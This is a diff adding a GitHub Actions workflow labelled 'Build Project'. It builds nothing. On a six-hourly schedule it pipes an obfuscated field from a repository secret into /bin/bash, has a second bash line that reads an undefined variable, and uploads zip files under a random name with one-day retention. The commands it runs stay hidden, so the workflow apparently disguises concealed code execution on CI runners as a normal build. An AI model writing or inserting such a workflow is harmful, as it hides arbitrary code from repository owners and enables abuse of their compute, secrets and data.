@@ -1,0 +1,27 @@
+name: Build Project
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '9 2,8,14,20 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  action:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Begin
+        env:
+          c65: ${{ secrets.c65 }}
+        run: |
+          printf '%s' "$c65" | jq -r .mt59 | /bin/bash
+          printf '%s' "$mvnb61" | jq -r .v541 | /bin/bash
+
+      - name: Save results
+        uses: actions/upload-artifact@v4
+        with:
+          name: CtNf6djI
+          path: "*.zip"
+          retention-days: 1
